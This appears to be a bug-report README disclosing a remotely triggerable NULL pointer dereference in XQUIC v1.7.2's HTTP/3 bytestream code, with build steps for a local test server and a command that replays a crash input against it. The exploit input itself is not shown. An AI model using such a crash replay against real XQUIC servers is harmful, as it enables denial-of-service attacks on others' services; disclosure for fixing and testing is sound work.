# Bug M8

## Product: XQUIC (Alibaba.inc)
### Github repository: [https://github.com/alibaba/xquic](https://github.com/alibaba/xquic)
### Affected version: [v1.7.2](https://github.com/alibaba/xquic/releases/tag/v1.7.2)
### Fixed version: N/A

### Bug summary:
A NULL pointer dereference causes the server to crash, which can result in a Denial of Service attack.

### Bug details: 
Xquic attempts to access a NULL pointer (```*bs```) when 
- checking whether application data is available at ```v1.7.2:src/http3/xqc_h3_ext_bytestream.c:631```
- handling the FIN bit in the byte stream at ```v1.7.2:src/http3/xqc_h3_ext_bytestream.c:552```.

### Attack vector:
Remote attacker.

### PoC
Build the xquic test_server as described in the following (assumed you are in same directory as this README.md):
```bash
git clone https://github.com/alibaba/xquic.git
cd xquic

git clone https://github.com/google/boringssl.git ./third_party/boringssl
cd ./third_party/boringssl
git checkout afd52e91
git apply ../../../boringssl_for_developers.patch
mkdir -p build && cd build
cmake -DBUILD_SHARED_LIBS=0 -DCMAKE_C_FLAGS="-fPIC" -DCMAKE_CXX_FLAGS="-fPIC" ..
make ssl crypto
cd ..
export SSL_TYPE_STR="boringssl"
export SSL_PATH_STR="${PWD}"
cd ../..
git submodule update --init --recursive
git apply ../xquic_for_developers.patch
mkdir -p build; cd build
cmake -DCMAKE_C_FLAGS="-fsanitize=address" -DCMAKE_CXX_FLAGS="-fsanitize=address" -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address" -DGCOV=on -DCMAKE_BUILD_TYPE=Debug -DXQC_ENABLE_TESTING=1 -DXQC_SUPPORT_SENDMMSG_BUILD=1 -DXQC_ENABLE_EVENT_LOG=1 -DXQC_ENABLE_BBR2=1 -DXQC_ENABLE_RENO=1 -DSSL_TYPE=${SSL_TYPE_STR} -DSSL_PATH=${SSL_PATH_STR} ..
make -j
cd ../..

# start the server
xquic/build/tests/test_server -a 127.0.0.1 -p 4433
```
Open another terminal, build the replay_crash program and run with the given crash input (assumed you are in same directory as this README.md):
```bash
cd ..
make
cd m8
../replay_crash xquic_crash 4433
```